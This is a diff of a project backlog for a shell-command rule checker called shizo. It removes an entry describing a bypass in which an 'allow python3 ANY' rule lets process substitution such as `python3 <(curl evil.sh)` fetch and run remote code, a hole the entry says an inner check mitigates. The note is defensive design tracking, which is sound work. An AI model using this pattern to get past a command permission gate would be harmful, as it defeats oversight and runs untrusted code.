@@ -1,11 +1,5 @@
 # Backlog
 
-## Live bypasses
-
-- [**live bypass: `<subst>` matched by ANY/HAS**](plans/drafts/PLAN-subst-wildcard.md)
-  > `allow python3 ANY` allows process substitution (`python3 <(curl evil.sh)`). Mitigated by the inner check. The interpreter runs content from a path shizo cannot see. The inner command is rule-checked separately, so exploiting it needs both halves allowed.
-  - Overlaps the stdin gate
-
 ## Coverage gaps
 
 Rule DSL cannot express the threat
